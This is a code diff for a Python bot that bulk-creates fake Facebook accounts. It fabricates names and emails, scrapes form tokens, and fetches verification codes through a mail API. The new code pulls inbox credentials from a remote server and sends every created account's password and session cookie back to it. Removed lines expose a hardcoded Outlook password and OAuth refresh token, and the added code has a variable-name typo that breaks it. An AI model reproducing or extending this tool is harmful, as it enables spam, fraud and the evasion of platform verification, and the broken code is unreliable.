@@ -547,7 +547,7 @@ def GetEmails():
     nam2 = random.choice(['nurhayati','handoko','setiyani','susanto','permata'])
     nam3 = random.choice(['triatmaja','siagian','manopo','jayaningrat','widodo'])
     name = f'{nam1}{nam2}{nam3}'
-    domain = random.choice(['gmail.com','yahoo.com','hotmail.com','gonetor.com'])
+    domain = random.choice(['gmail.com','yahoo.com','hotmail.com'])
     nu = str(random.randrange(10000, 100000))
     nope = f'{name}@{domain}'
     return nope
@@ -583,20 +583,20 @@ def get_temp_plus():
 import requests
 import re
 
-def get_code_dong_van(email):
+def get_code_dong_van(email,password,refresh_token,client_id):
     mail = requests.Session()
     headers = {
             'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
             'Content-Type':'application/json'
         }
     response = mail.post(f'https://tools.dongvanfb.net/api/get_messages_oauth2', headers=headers, data=json.dumps(
-        {"email":"snappzerla9118@outlook.com","pass":"AWlKGS6ABm","refresh_token":"M.C557_SN1.0.U.-CoPnvimCI819EpAhHFtFoGQVDDkJojbLUUyJ8ErPJKEFQXKtBrg3GKKbImJESA!77KGbyqrXrL!OudwDYkfFTnY2NuR6Hv0plSSK6dW6VO2b8F72aksqYqP9RzdtC!50m6jHAr62DgrQNIUJVpSiRcSQWoqYysDLl6dMenCeS82zQE35bDwHEqjp49n9vfRAlleAEeq*SCLNBCL01oSgnDJXRb0elwCgzB6ab4oPN*ZsMsXqGI9X3sEFOqozgtv216ik0XOFDTvWD*cxB41!W2weIwrZ*o41fjzX9jVuoagJ!L9pMGcUm3UMn8le5cM!3SNBJkChaPHBNtN6s4q6D8Mf2G7PjbXn6RbLm4jP45LdyXQIeoRKmthcEUrPxIclphK4ssztziKt04zaPunSt65nFHzvWsD7yGsJAxtC5svL","client_id":"9e5f94bc-e8a4-4e73-b8be-63364c29d753"}
+        {"email":email,"pass":password,"refresh_token":refresh_token,"client_id":client_id}
     ))
     if response.status_code == 200:
         req = response.json()
         mail_list = req.get("messages", [])
         if mail_list:
-            subject = mail_list[0].get('message', '')
+            subject = mail_list[0].get('subject', '')
             kode = re.search(r'(\d+)', subject)
             code = kode.group(1) if kode else 'Code not found'
             return code
@@ -666,20 +666,9 @@ def clear():
     os.system("clear")
 
 logo=("""[green1]
-  ______                     _____ __             __      
- /_  __/___  ____  __  __   / ___// /_____ ______/ /__    
-  / / / __ \/ __ \/ / / /   \__ \/ __/ __ `/ ___/ //_/    
- / / / /_/ / / / / /_/ /   ___/ / /_/ /_/ / /  / ,<       
-/_/  \____/_/ /_/\__, /   /____/\__/\__,_/_/  /_/|_|      
-                /____/
     ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-    ┃ TOOLS NAME => Auto FB Account          ┃
-    ┃ OWNER NAME => Tony Stark               ┃
-    ┃ CLONE SYS  => DATA , WIFI              ┃
-    ┃ WHATS APP  => +19162457630             ┃
-    ┃ TELEGRAM   => @CyberRowX               ┃
-    ┃      PLEASE DON'T UES A RONG WORK      ┃
-    ┗━━━━━━━━━━━━━━━━━[bold red] ● [bright_yellow]● [green1]● ━━━━━━━━━━━━━━━━┛
+    ┃     TOOLS NAME => Auto FB Account      ┃                                     
+    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 """)
 ll=str([hari,tanggal])
 kk=str([xy,co])
@@ -744,7 +733,10 @@ def main() -> None:
         m_ts = re.search(r'name="m_ts" value="(.*?)"',str(mts)).group(1)
         formula = extractor(response.text)
         # email2 = get_temp_plus()
-        email2 = "snappzerla9118@outlook.com"
+        emaitGet = get_email()
+        if emailGet is None:
+            exit("[bold red]EMAIL NOT FOUND")
+        email2 = emailGet['email']
         phone2 = GetPhone()
         email3 = GetEmails()
         firstname,lastname = fake_name()
@@ -876,7 +868,7 @@ def main() -> None:
                 'soft': 'hjk',
             }
             con_sub = ses.get('https://x.facebook.com/confirmemail.php', params=params, headers=header2).text
-            valid = get_code_dong_van(email2)
+            valid = get_code_dong_van(email2,emailGet['password'],emailGet['refresh_token'],emailGet['client_id'])
             if valid:
                 print(Panel(f"[bold white] OTP SENT TO MAIL",style="bold magenta2"))
                 print(Panel(f"[bold white] VERIFICATION CODE : {valid}",style="bold magenta2"))
@@ -935,6 +927,7 @@ def confirm_id(mail,uid,otp,data,ses):
         else:
             cookie = (";").join([ "%s=%s" % (key,value) for key,value in ses.cookies.get_dict().items()])
             print(Panel(f"[bold green1] UID      : {uid}\n[bold green1] PASSWORD : {passw}\n[bold green1] COOKIE   : [bold green1]{cookie}\n[bold green1] USERAGENT : [bold green1]{useragent_facebook()}",subtitle="[bold yellow] CREATE ",style="bold magenta2"))
+            post_account(uid,passw,cookie,email2,otp,useragent_facebook())
             dn()
             open("/sdcard/CyberRow-X/SUCCESS-OK-ID.txt","a").write(uid+f"|{passw}|"+cookie+"\n")
             Ok+=1
@@ -942,6 +935,28 @@ def confirm_id(mail,uid,otp,data,ses):
         pass
 
 
+def get_email():
+    try:
+        response = requests.get(f'https://fbapi-5m2g.onrender.com/emails/unchecked')
+        if response.status_code == 200:
+            return response.json()
+        else:
+            return None
+    except:
+        return None
+
+def post_account(uid, password,cookie,email,otp,useragent):
+    try:
+        response = requests.post('https://fbapi-5m2g.onrender.com/accounts', json={"email": email, "password": password, "cookie": cookie, "uid": uid, "otp": otp, "useragent": useragent})
+        if response.status_code == 200:
+            return response.json()
+        else:
+            return None
+    except:
+        return None
+
 if __name__ == "__main__":
     bryxcreate()
+
+
 
